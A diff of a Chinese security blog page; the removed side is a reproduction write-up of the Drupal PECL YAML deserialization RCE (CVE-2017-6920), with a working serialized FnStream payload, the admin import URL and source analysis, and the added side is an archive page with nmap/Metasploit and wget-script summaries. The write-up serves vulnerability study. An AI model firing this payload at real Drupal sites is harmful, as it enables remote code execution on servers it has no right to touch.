@@ -5,13 +5,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="W4nde3&#39;s Secret">
+    <meta name="keywords" content="归档: 2020/12, W4nde3&#39;s Secret">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)复现phpinfo
-搭建好环境，服务开放于http://45.32.74.108:8000 
-
-序列化一个GuzzleHttp\Psr7\FnSt">
+    <meta name="description" content="归档: 2020/12 | W4nde3&#39;s Secret">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>W4nde3&#39;s Secret</title>
+    <title>归档: 2020/12 | W4nde3&#39;s Secret</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -468,544 +465,238 @@
 
 </header>
 
-        
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
+        <div class="bg-cover pd-header about-cover">
+    <div class="container">
+    <div class="row">
+    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
+        <div class="brand">
+            <div class="title center-align">
+                <!-- 
+                    blog
+                 -->
+                
+                    归档
+                
+            </div>
+
+            <div class="description center-align">
+                
+                    <!-- 东北大学 | 信息安全 | 滑水CTF选手 | 渗透入门 | 安全工具开发 -->
+                    <span id="jinrishici-sentence">正在加载今日诗词...</span>
+                
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
 <script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
+// 每天切换 banner 图.  Switch banner image every day.
+$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');
 </script>
 
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
-    <div class="container">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <div class="description center-align post-title">
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
     </div>
 </div>
 
-
-
-<main class="post-container content">
+<main class="content">
 
     
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #toc-content .is-active-link::before {
-        background-color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 20px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
+    <div class="container archive-calendar">
     <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                </div>
-            </div>
-            
-            <div class="post-info">
-                <div class="post-date info-break-policy">
-                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-17
-                </div>
-
-                <div class="post-author info-break-policy">
-                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
-                    
-                        W4nde3
-                    
-                </div>
-
-                
-                    
-                    <div class="info-break-policy">
-                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        774
-                    </div>
-                    
-
-                    
-                    <div class="info-break-policy">
-                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
-                    </div>
-                    
-                
-                
-                
-                        <span id="busuanzi_container_site_pv" style='display:none'></span>
-                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv" ></span>
-    
-                
-
-            </div>
-        </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h1 id="Drupal-PECL-YAML-parser-远程代码执行漏洞-CVE-2017-6920"><a href="#Drupal-PECL-YAML-parser-远程代码执行漏洞-CVE-2017-6920" class="headerlink" title="Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)"></a>Drupal PECL YAML parser 远程代码执行漏洞(CVE-2017-6920)</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><ol>
-<li><p>搭建好环境，服务开放于<a href="http://45.32.74.108:8000" target="_blank" rel="noopener">http://45.32.74.108:8000</a> </p>
-</li>
-<li><p>序列化一个<code>GuzzleHttp\Psr7\FnStream</code>类, 并给该序列化字符串加上yaml的<code>!php/object</code></p>
-<pre><code>!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"</code></pre></li>
-</ol>
-<ol start="3">
-<li>登陆一个管理员账号，访问 <a href="http://127.0.0.1:8000/admin/config/development/configuration/single/import" target="_blank" rel="noopener">http://127.0.0.1:8000/admin/config/development/configuration/single/import</a></li>
-<li>填写表单<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/047dda655e7a8421.png" alt=""></li>
-<li>点击import即可触发<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/42aade8fa6302025.png" alt=""></li>
-</ol>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>对比Drupal的8.3.3和8.3.4版本，发现主要有四个文件做了改动：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/b7fc8ee055752f1e.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/1c0b85a0157ec366.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/bb0acc60c87888a5.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/25b1146157293846.png" alt=""><br>漏洞点在/Drupal/Component/Serialization/YamlPecl.php的decode函数中</p>
-<pre><code>public static function decode($raw) {
-  // yaml_parse() will error with an empty value.
-  if (!trim($raw)) {
-    return NULL;
-  }
-  set_error_handler([__CLASS__, 'errorHandler']);
-  $ndocs = 0;
-  $data = yaml_parse($raw, 0, $ndocs, [
-    YAML_BOOL_TAG =&gt; '\Drupal\Component\Serialization\YamlPecl::applyBooleanCallbacks',
-  ]);
-  restore_error_handler();
-  return $data;
-}</code></pre><p>参数$raw被带入yaml_parse函数中，其中$raw可控，在文档中有一个特别声明：</p>
-<p>Warning Processing untrusted user input with yamlparse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decodephp ini setting. </p>
-<p>因此可以通过<code>!php/object</code>声明一个节点，然后用这个节点内容以unserialize的方式处理。找到调用这个YamlPecl::decode函数的地方：</p>
-<pre><code>public static function decode($raw) {
-   $serializer = static::getSerializer();
-   return $serializer::decode($raw);
- }
-
- protected static function getSerializer() {
-   if (!isset(static::$serializer)) {
-     if (extension_loaded('yaml')) {
-       static::$serializer = YamlPecl::class;
-     }
-     else {
-       // Otherwise, fallback to the Symfony implementation.
-       static::$serializer = YamlSymfony::class;
-     }
-   }
-   return static::$serializer;
- }</code></pre><p>这里会检测是否加载了Yaml的插件，如果加载插件则会调用到危险函数。找调用了Yaml::decode函数的外部可控点，在/core/modules/config/src/Form/ConfigSingleImportForm.php中第280行：</p>
-<pre><code>public function validateForm(array &amp;$form, FormStateInterface $form_state) { // The confirmation step needs no additional validation. if ($this-&gt;data) { return; }
-try {
-  // Decode the submitted import.
-  $data = Yaml::decode($form_state-&gt;getValue('import'));
-}
-catch (InvalidDataTypeException $e) {
-  $form_state-&gt;setErrorByName('import', $this-&gt;t('The import failed with the following message: %message', ['%message' =&gt; $e-&gt;getMessage()]));
-}</code></pre><p>到这里已经找到了触发PHP反序列化的函数和可控点，只需找到能够反序列化执行函数或写文件的类即可，全局搜索__destruct和__weakup,在/vendor/guzzlehttp/psr7/src/FnStream.php中第48行中能够找到执行无参函数的漏洞点</p>
-<pre><code>public function __destruct() { 
-if (isset($this-&gt;_fn_close)) { call_user_func($this-&gt;_fn_close); } 
-} </code></pre><p>因此构造出Payload：</p>
-<pre><code>!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"</code></pre><h3 id="关于Yaml插件安装"><a href="#关于Yaml插件安装" class="headerlink" title="关于Yaml插件安装"></a>关于Yaml插件安装</h3><p><a href="http://pecl.php.net/package/yaml" target="_blank" rel="noopener">下载插件</a>后进入目录：</p>
-<pre><code>$ phpize
-$ ./configure
-$ make
-$ make install</code></pre><p>若成功则会返回编译好的扩展所在目录，在php.ini中修改extension_dir=[这个目录]，再设置extension=yaml.so即可</p>
-<p>阿斯顿发</p>
-<pre><code>yaml_parse函数：将部分或所有的YAML文档流转换成PHP对象
-mixed yaml_parse ( string $input [, int $pos = 0 [, int &amp;$ndocs [, array $callbacks ]]] )
-
-input
-The string to parse as a YAML document stream.
-pos
-Document to extract from stream (-1 for all documents, 0 for first document, ...).
-ndocs
-If ndocs is provided, then it is filled with the number of documents found in stream.
-callbacks
-Content handlers for YAML nodes. Associative array of YAML tag =&gt; callable mappings. See parse callbacks for more details.</code></pre><script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
-            </div>
-            <hr/>
-
-            
-
-            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-
-<div id="article-share">
-    
-    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
-    
+        <div id="post-calendar" class="card-content"></div>
+    </div>
 </div>
 
-<script src="/libs/share/js/social-share.min.js"></script>
+<script type="text/javascript" src="https://cdn.bootcss.com/echarts/4.7.0/echarts.min.js"></script>
+<script type="text/javascript">
+    let myChart = echarts.init(document.getElementById('post-calendar'));
 
-            
-            
-            
-            <div class="reprint1">
-                <p>
-                    <span class="reprint1-tip">
-                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
-                    </span>
-                    <a href="https://blog.iwonder.run" class="b-link-green">W4nde3's Secret</a>
-                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/11/17/drupal-8.3.3-rce/" class="b-link-green"></a>
-                </p>
-            </div>
+    
 
-        </div>
-    </div>
+    let option = {
+        title: {
+            top: 0,
+            text: '文章日历',
+            left: 'center',
+            textStyle: {
+                color: '#3C4858'
+            }
+        },
+        tooltip: {
+            padding: 10,
+            backgroundColor: '#555',
+            borderColor: '#777',
+            borderWidth: 1,
+            formatter: function (obj) {
+                var value = obj.value;
+                return '<div style="font-size: 14px;">' + value[0] + '：' + value[1] + '</div>';
+            }
+        },
+        visualMap: {
+            show: true,
+            showLabel: true,
+            categories: [0, 1, 2, 3, 4],
+            calculable: true,
+            inRange: {
+                symbol: 'rect',
+                color: ['#ebedf0', '#c6e48b', '#7bc96f', '#239a3b', '#196127']
+            },
+            itemWidth: 12,
+            itemHeight: 12,
+            orient: 'horizontal',
+            left: 'center',
+            bottom: 0
+        },
+        calendar: [{
+            left: 'center',
+            range: ["2019-12-03", "2020-12-03"],
+            cellSize: [13, 13],
+            splitLine: {
+                show: false
+            },
+            itemStyle: {
+                borderColor: '#fff',
+                borderWidth: 2
+            },
+            yearLabel: {
+                show: false
+            },
+            monthLabel: {
+                nameMap: 'cn',
+                fontSize: 11
+            },
+            dayLabel: {
+                formatter: '{start}  1st',
+                nameMap: 'cn',
+                fontSize: 11
+            }
+        }],
+        series: [{
+            type: 'heatmap',
+            coordinateSystem: 'calendar',
+            calendarIndex: 0,
+            data: [["2019-12-03", 0], ["2019-12-04", 0], ["2019-12-05", 0], ["2019-12-06", 0], ["2019-12-07", 0], ["2019-12-08", 0], ["2019-12-09", 0], ["2019-12-10", 0], ["2019-12-11", 0], ["2019-12-12", 0], ["2019-12-13", 0], ["2019-12-14", 0], ["2019-12-15", 0], ["2019-12-16", 0], ["2019-12-17", 0], ["2019-12-18", 0], ["2019-12-19", 0], ["2019-12-20", 0], ["2019-12-21", 0], ["2019-12-22", 0], ["2019-12-23", 0], ["2019-12-24", 0], ["2019-12-25", 0], ["2019-12-26", 0], ["2019-12-27", 0], ["2019-12-28", 0], ["2019-12-29", 0], ["2019-12-30", 0], ["2019-12-31", 0], ["2020-01-01", 0], ["2020-01-02", 0], ["2020-01-03", 0], ["2020-01-04", 0], ["2020-01-05", 0], ["2020-01-06", 0], ["2020-01-07", 0], ["2020-01-08", 0], ["2020-01-09", 0], ["2020-01-10", 0], ["2020-01-11", 0], ["2020-01-12", 0], ["2020-01-13", 0], ["2020-01-14", 0], ["2020-01-15", 0], ["2020-01-16", 0], ["2020-01-17", 0], ["2020-01-18", 0], ["2020-01-19", 0], ["2020-01-20", 0], ["2020-01-21", 0], ["2020-01-22", 0], ["2020-01-23", 0], ["2020-01-24", 0], ["2020-01-25", 0], ["2020-01-26", 0], ["2020-01-27", 0], ["2020-01-28", 0], ["2020-01-29", 0], ["2020-01-30", 0], ["2020-01-31", 0], ["2020-02-01", 0], ["2020-02-02", 0], ["2020-02-03", 0], ["2020-02-04", 0], ["2020-02-05", 0], ["2020-02-06", 0], ["2020-02-07", 0], ["2020-02-08", 0], ["2020-02-09", 0], ["2020-02-10", 0], ["2020-02-11", 0], ["2020-02-12", 0], ["2020-02-13", 0], ["2020-02-14", 0], ["2020-02-15", 0], ["2020-02-16", 0], ["2020-02-17", 0], ["2020-02-18", 0], ["2020-02-19", 0], ["2020-02-20", 0], ["2020-02-21", 0], ["2020-02-22", 0], ["2020-02-23", 0], ["2020-02-24", 0], ["2020-02-25", 0], ["2020-02-26", 0], ["2020-02-27", 0], ["2020-02-28", 0], ["2020-02-29", 0], ["2020-03-01", 0], ["2020-03-02", 0], ["2020-03-03", 0], ["2020-03-04", 0], ["2020-03-05", 0], ["2020-03-06", 0], ["2020-03-07", 0], ["2020-03-08", 0], ["2020-03-09", 0], ["2020-03-10", 0], ["2020-03-11", 0], ["2020-03-12", 0], ["2020-03-13", 0], ["2020-03-14", 0], ["2020-03-15", 0], ["2020-03-16", 0], ["2020-03-17", 0], ["2020-03-18", 0], ["2020-03-19", 0], ["2020-03-20", 0], ["2020-03-21", 0], ["2020-03-22", 0], ["2020-03-23", 0], ["2020-03-24", 0], ["2020-03-25", 0], ["2020-03-26", 0], ["2020-03-27", 0], ["2020-03-28", 0], ["2020-03-29", 0], ["2020-03-30", 0], ["2020-03-31", 0], ["2020-04-01", 0], ["2020-04-02", 0], ["2020-04-03", 0], ["2020-04-04", 0], ["2020-04-05", 0], ["2020-04-06", 0], ["2020-04-07", 0], ["2020-04-08", 0], ["2020-04-09", 0], ["2020-04-10", 0], ["2020-04-11", 0], ["2020-04-12", 0], ["2020-04-13", 0], ["2020-04-14", 0], ["2020-04-15", 0], ["2020-04-16", 0], ["2020-04-17", 0], ["2020-04-18", 0], ["2020-04-19", 0], ["2020-04-20", 0], ["2020-04-21", 0], ["2020-04-22", 0], ["2020-04-23", 0], ["2020-04-24", 0], ["2020-04-25", 0], ["2020-04-26", 0], ["2020-04-27", 0], ["2020-04-28", 0], ["2020-04-29", 0], ["2020-04-30", 0], ["2020-05-01", 0], ["2020-05-02", 0], ["2020-05-03", 0], ["2020-05-04", 0], ["2020-05-05", 0], ["2020-05-06", 0], ["2020-05-07", 0], ["2020-05-08", 0], ["2020-05-09", 0], ["2020-05-10", 0], ["2020-05-11", 0], ["2020-05-12", 0], ["2020-05-13", 0], ["2020-05-14", 0], ["2020-05-15", 0], ["2020-05-16", 0], ["2020-05-17", 0], ["2020-05-18", 0], ["2020-05-19", 0], ["2020-05-20", 0], ["2020-05-21", 0], ["2020-05-22", 0], ["2020-05-23", 0], ["2020-05-24", 0], ["2020-05-25", 0], ["2020-05-26", 0], ["2020-05-27", 0], ["2020-05-28", 0], ["2020-05-29", 0], ["2020-05-30", 0], ["2020-05-31", 0], ["2020-06-01", 0], ["2020-06-02", 0], ["2020-06-03", 0], ["2020-06-04", 0], ["2020-06-05", 0], ["2020-06-06", 0], ["2020-06-07", 0], ["2020-06-08", 0], ["2020-06-09", 0], ["2020-06-10", 0], ["2020-06-11", 0], ["2020-06-12", 0], ["2020-06-13", 0], ["2020-06-14", 0], ["2020-06-15", 0], ["2020-06-16", 0], ["2020-06-17", 0], ["2020-06-18", 0], ["2020-06-19", 0], ["2020-06-20", 0], ["2020-06-21", 0], ["2020-06-22", 0], ["2020-06-23", 0], ["2020-06-24", 0], ["2020-06-25", 0], ["2020-06-26", 0], ["2020-06-27", 0], ["2020-06-28", 0], ["2020-06-29", 0], ["2020-06-30", 0], ["2020-07-01", 0], ["2020-07-02", 0], ["2020-07-03", 0], ["2020-07-04", 0], ["2020-07-05", 0], ["2020-07-06", 0], ["2020-07-07", 0], ["2020-07-08", 0], ["2020-07-09", 0], ["2020-07-10", 0], ["2020-07-11", 0], ["2020-07-12", 0], ["2020-07-13", 0], ["2020-07-14", 0], ["2020-07-15", 0], ["2020-07-16", 0], ["2020-07-17", 0], ["2020-07-18", 0], ["2020-07-19", 0], ["2020-07-20", 0], ["2020-07-21", 0], ["2020-07-22", 0], ["2020-07-23", 0], ["2020-07-24", 0], ["2020-07-25", 0], ["2020-07-26", 0], ["2020-07-27", 0], ["2020-07-28", 0], ["2020-07-29", 0], ["2020-07-30", 0], ["2020-07-31", 0], ["2020-08-01", 0], ["2020-08-02", 0], ["2020-08-03", 0], ["2020-08-04", 0], ["2020-08-05", 0], ["2020-08-06", 0], ["2020-08-07", 0], ["2020-08-08", 0], ["2020-08-09", 0], ["2020-08-10", 0], ["2020-08-11", 0], ["2020-08-12", 0], ["2020-08-13", 0], ["2020-08-14", 0], ["2020-08-15", 0], ["2020-08-16", 0], ["2020-08-17", 0], ["2020-08-18", 0], ["2020-08-19", 0], ["2020-08-20", 0], ["2020-08-21", 0], ["2020-08-22", 0], ["2020-08-23", 0], ["2020-08-24", 0], ["2020-08-25", 0], ["2020-08-26", 0], ["2020-08-27", 0], ["2020-08-28", 0], ["2020-08-29", 0], ["2020-08-30", 0], ["2020-08-31", 0], ["2020-09-01", 0], ["2020-09-02", 0], ["2020-09-03", 0], ["2020-09-04", 0], ["2020-09-05", 0], ["2020-09-06", 0], ["2020-09-07", 0], ["2020-09-08", 0], ["2020-09-09", 0], ["2020-09-10", 0], ["2020-09-11", 0], ["2020-09-12", 0], ["2020-09-13", 0], ["2020-09-14", 0], ["2020-09-15", 0], ["2020-09-16", 0], ["2020-09-17", 0], ["2020-09-18", 0], ["2020-09-19", 0], ["2020-09-20", 0], ["2020-09-21", 0], ["2020-09-22", 0], ["2020-09-23", 0], ["2020-09-24", 0], ["2020-09-25", 0], ["2020-09-26", 0], ["2020-09-27", 0], ["2020-09-28", 0], ["2020-09-29", 0], ["2020-09-30", 0], ["2020-10-01", 0], ["2020-10-02", 0], ["2020-10-03", 0], ["2020-10-04", 0], ["2020-10-05", 0], ["2020-10-06", 0], ["2020-10-07", 0], ["2020-10-08", 0], ["2020-10-09", 0], ["2020-10-10", 0], ["2020-10-11", 0], ["2020-10-12", 0], ["2020-10-13", 0], ["2020-10-14", 0], ["2020-10-15", 0], ["2020-10-16", 0], ["2020-10-17", 0], ["2020-10-18", 0], ["2020-10-19", 0], ["2020-10-20", 0], ["2020-10-21", 0], ["2020-10-22", 0], ["2020-10-23", 0], ["2020-10-24", 0], ["2020-10-25", 0], ["2020-10-26", 0], ["2020-10-27", 0], ["2020-10-28", 0], ["2020-10-29", 0], ["2020-10-30", 0], ["2020-10-31", 0], ["2020-11-01", 0], ["2020-11-02", 0], ["2020-11-03", 0], ["2020-11-04", 0], ["2020-11-05", 0], ["2020-11-06", 0], ["2020-11-07", 0], ["2020-11-08", 0], ["2020-11-09", 1], ["2020-11-10", 0], ["2020-11-11", 1], ["2020-11-12", 0], ["2020-11-13", 0], ["2020-11-14", 0], ["2020-11-15", 0], ["2020-11-16", 1], ["2020-11-17", 1], ["2020-11-18", 0], ["2020-11-19", 0], ["2020-11-20", 0], ["2020-11-21", 0], ["2020-11-22", 0], ["2020-11-23", 0], ["2020-11-24", 0], ["2020-11-25", 0], ["2020-11-26", 0], ["2020-11-27", 0], ["2020-11-28", 0], ["2020-11-29", 0], ["2020-11-30", 0], ["2020-12-01", 0], ["2020-12-02", 2], ["2020-12-03", 0]]
+        }]
 
+    };
+
+    myChart.setOption(option);
+</script>
     
 
     
 
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
+    <div id="cd-timeline" class="container">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2020/12/02/host-discovery/">
-                    <div class="card-image">
+        <div class="cd-timeline-block">
+
+            
+            
+            
+            <div class="cd-timeline-img year" data-aos="zoom-in-up">
+                <a href="/archives/2020">2020</a>
+            </div>
+            
+
+            
+            
+            
+            <div class="cd-timeline-img month" data-aos="zoom-in-up">
+                <a href="/archives/2020/12">12</a>
+            </div>
+            
+
+            
+            <div class="cd-timeline-img day" data-aos="zoom-in-up">
+                <span>02</span>
+            </div>
+            <article class="cd-timeline-content" data-aos="fade-up">
+                <div class="article col s12 m6">
+                    <div class="card">
+                        <a href="/2020/12/02/ss-ssr-notes/">
+                            <div class="card-image">
+                                
+                                
+                                <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="">
+                                
+                                <span class="card-title"></span>
+                            </div>
+                        </a>
+                        <div class="card-content article-content">
+                            <div class="summary block-with-text">
+                                
+                                SSR备忘部署yum -y install wget
+wget -N –no-check-certificate https://raw.githubusercontent.com/W4nde3/shs/main/ssr.sh &amp;&
+                                
+                            </div>
+                            <div class="publish-info">
+                                <span class="publish-date">
+                                    <i
+                                        class="fa fa-clock-o fa-fw icon-date"></i>2020-12-02
+                                </span>
+                                <span class="publish-author">
+                                    
+                                </span>
+                            </div>
+                        </div>
+
                         
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="">
-                        
-                        <span class="card-title"></span>
                     </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            主机发现UDPnmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500
+                </div>
+            </article>
+        </div>
+        
+        <div class="cd-timeline-block">
+
+            
+            
+
+            
+            
+
+            
+            <div class="cd-timeline-img day" data-aos="zoom-in-up">
+                <span>02</span>
+            </div>
+            <article class="cd-timeline-content" data-aos="fade-up">
+                <div class="article col s12 m6">
+                    <div class="card">
+                        <a href="/2020/12/02/host-discovery/">
+                            <div class="card-image">
+                                
+                                
+                                <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="">
+                                
+                                <span class="card-title"></span>
+                            </div>
+                        </a>
+                        <div class="card-content article-content">
+                            <div class="summary block-with-text">
+                                
+                                主机发现UDPnmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500
 msf &gt; use auxiliary/scanner/discovery/udp_probe
 msf &gt;
+                                
+                            </div>
+                            <div class="publish-info">
+                                <span class="publish-date">
+                                    <i
+                                        class="fa fa-clock-o fa-fw icon-date"></i>2020-12-02
+                                </span>
+                                <span class="publish-author">
+                                    
+                                </span>
+                            </div>
+                        </div>
+
                         
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-02
-                        </span>
-                        <span class="publish-author">
-                            
-                        </span>
                     </div>
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/11/16/books/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="">
-                        
-                        <span class="card-title"></span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            原文链接：传送门免费计算机书籍汇总。
-没有注明语种的，都为英语资源。
-目录
-一、Web 开发
-二、系统管理
-三、编程语言
-四、数据库
-五、软件开发
-六、人工智能
-七、数学理论
-八、其他
-
-一、Web 开发1.1 JavaScript 语言
-
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-16
-                            </span>
-                        <span class="publish-author">
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
+            </article>
         </div>
         
     </div>
-</article>
-</div>
-
-
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('50')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: W4nde3's Secret<br />'
-            + '作者: W4nde3<br />'
-            + '链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fa fa-list"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
